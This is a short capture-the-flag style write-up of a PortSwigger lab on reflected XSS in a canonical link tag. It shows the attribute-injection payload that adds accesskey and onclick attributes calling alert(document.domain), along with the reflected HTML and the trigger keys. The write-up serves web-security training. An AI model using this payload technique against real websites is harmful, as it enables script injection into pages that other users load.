# Reflected XSS in canonical link tag

**Lab URL:** https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag

## Metadata

| Property | Value |
|----------|-------|

---

### Target Goal - 

Perform an XSS attack on the homepage that injects an attribute that calls the alert function

### Analysyis/Exploitation

**View source page:**

![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/images/92eccbf237d5_001.png)

In here, we can see that there is a `<link>` tag is using **canonical** link tag.

**To exploit it, we can try to inject **`accesskey`** attribute with an **`onclick`** event:**

`/?'accesskey='x'onclick='alert(document.domain)`

**Result:**

`<link rel="canonical" href='https://0a2200b504a6441cc040ccd100c20002.web-security-academy.net/?'accesskey='x'onclick='alert(document.domain)'/>`

**Now press:**

- On Windows: `Alt + Shift + x`
- On MacOS: `Ctrl + Alt + x`
- On Linux: `Alt + x`
